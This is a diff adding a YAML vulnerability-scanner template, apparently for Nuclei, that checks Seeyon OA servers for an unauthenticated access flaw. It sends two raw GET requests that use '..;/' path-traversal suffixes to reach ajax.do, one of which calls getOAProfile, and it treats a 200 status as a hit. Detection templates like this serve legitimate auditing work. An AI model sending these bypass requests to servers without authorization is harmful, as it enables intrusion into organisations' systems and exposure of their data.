@@ -1,0 +1,32 @@
+id: poc-yaml-seeyon-ajax-unauthorized-access
+
+info:
+  name: poc-yaml-seeyon-ajax-unauthorized-access
+  author: x1n9Qi8
+  severity: critical
+  tags: xray-converted,unauth,ct-158762
+  reference:
+    - https://mp.weixin.qq.com/s/bHKDSF7HWsAgQi9rTagBQA
+    - https://buaq.net/go-53721.html
+
+http:
+  - raw:
+      - |
+        GET /seeyon/thirdpartyController.do.css/..;/ajax.do HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
